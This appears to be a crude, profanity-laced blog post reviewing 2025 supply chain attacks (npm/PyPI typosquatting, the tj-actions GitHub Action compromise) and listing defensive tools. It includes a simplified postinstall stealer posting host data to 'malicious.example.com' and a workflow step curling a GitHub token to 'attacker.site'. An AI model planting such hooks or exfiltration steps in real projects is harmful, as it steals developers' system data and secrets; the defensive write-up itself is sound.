Sup fuck nuts today we're talking about Supply Chain Attacks :D. Lets start off with the easy bit:

## NPM Typosquatting to Nasty Stealer
In mid May 2025, researchers at Socket reported around 60 malicious npm packages uploaded under typosquatted names such as `flipper-plugins` or `react-xterm2`. These packages executed post install scripts, collecting data like hostname, internal IPs, usernames, DNS settings and sent it back to a C2 server. They even checked for cloud-provider hostnames to evade sandbox environments. Under the common name these little shitty payloads are called "Stealers" or "INFOGbs" stealing all info they can without being detected.

Here’s how a very simplified version of the malicious `postinstall.js` looked:
```javascript
const os = require('os');
const dns = require('dns');
const https = require('https');

const payload = {
  hostname: os.hostname(),
  interfaces: os.networkInterfaces(),
  platform: os.platform(),
};

const req = https.request({
  hostname: 'malicious.example.com',
  path: '/steal',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, () => {});
req.write(JSON.stringify(payload));
req.end();
```

This is obviously very dumbed down but this style of attack shows how simple typosquatting and post install script logic can quietly gather host level metadata during `npm install`. The packages gathered over 3,000 downloads before removal

**Lessons:**
- Always pin trusted package names and audit post install behavior.
- Sandbox or deny postinstall hooks whenever possible.
- Rotate any production creds and enable 2FA *ASAP* if exposure is suspected.

## Python & NPM Cross Ecosystem Typosquatting

In June 2025, a campaign targeting both PyPI and npm was identified. It included packages like `graphalgo` on PyPI and `express-cookie-parser` on npm - mimicking legitimate names, but laden with malware. These packages delivered cryptocurrency stealers ("drainers"), Discord token exfiltration, and malware capable of wiping full codebases.

Attackers also used domain generation algorithms (DGAs) to rotate C2 addresses dynamically, making detection and blocking harder. On PyPI, the fake `graphalgo` was published on June 13, 2025 by user "@larrytech".

**Lessons:**
- Deploy dependency scanners that detect typos and DGA indicators (e.g. [GuardDog](https://github.com/datadog/guarddog)).
- Avoid installing unverified packages, even if names seem trustworthy.
- Enforce signing or vetting of published packages in enterprise ecosystems.

## GitHub Action 'Hijack' - CVE‑2025‑30066

In early March 2025, an attacker compromised the `tj-actions/changed-files` GitHub Action. It’s used by over 23,000 repositories to detect changed files in pull requests. Between March 12 and March 15 UTC, the action was modified so that all version tags (v1 through v45.0.7) pointed to a malicious commit (`0e58ed8`) that printed runner secrets to build logs.

Typical malicious YAML:
```yaml
name: Conditional Build
on: [push, pull_request]
jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@v45.0.0
      - name: Exfiltrate secret
        run: |
          curl -X POST https://attacker.site/secret -d "${{ secrets.GITHUB_TOKEN }}"
```

This exposed GitHub tokens, npm tokens, RSA keys, and more visible in CI logs on public repos. The incident was tracked as CVE‑2025‑30066 and has since been fixed in version 46.0.1.

**Lessons:**
- Always pin Actions to commit SHAs, not tags.
- Review workflows for new action additions, especially from forks.
- Rotate tokens if you used affected versions during March 12-15.
- Delete any build logs containing secrets, and audit for outbound network calls.

## Practical Defenses in 2025

### Verify container and artifact integrity

```bash
cosign verify ghcr.io/org/app@sha256:ABCDEF123456 --key cosign.pub
```

Using Sigstore tools like `cosign` or `rekor` ensures you're deploying signed artifacts, not tampered ones.

### Automate SBOM generation and vulnerability scanning

```bash
syft your-app:latest -o cyclonedx > sbom.json
grype sbom:sbom.json
```

This lets you track dependencies and flag risky components before production releases.

### Scan open‑source packages proactively

```bash
pip install guarddog
guarddog scan graphalgo express-cookie-parser
```

The OpenSSF [GuardDog](https://github.com/datadog/guarddog) tool flags indicators like DGA domains, typosquatting patterns, unexpected post-install hooks, or obfuscated code.

## Overview Time

Over the first half of 2025, we’ve seen a pattern.
Attackers continue to target development ecosystems in ways that assume trust from typosquatted npm/PyPI packages to supply chain hijacks of GitHub Actions. These campaigns have been more stealthy, cross‑platform, and effective at hitting development pipelines directly.

In response, defenders must adopt:
- Dependency allow listing and strict package naming policies
- Artifact signing and SBOM enforcement
- SHA‑pinned actions, minimized secret exposure, branch protection
- Automated detection tools like [GuardDog](https://github.com/datadog/guarddog) and semgrep rules that flag unusual package metadata

The integrity of software depends on not just building securely but validating every inch of everything.
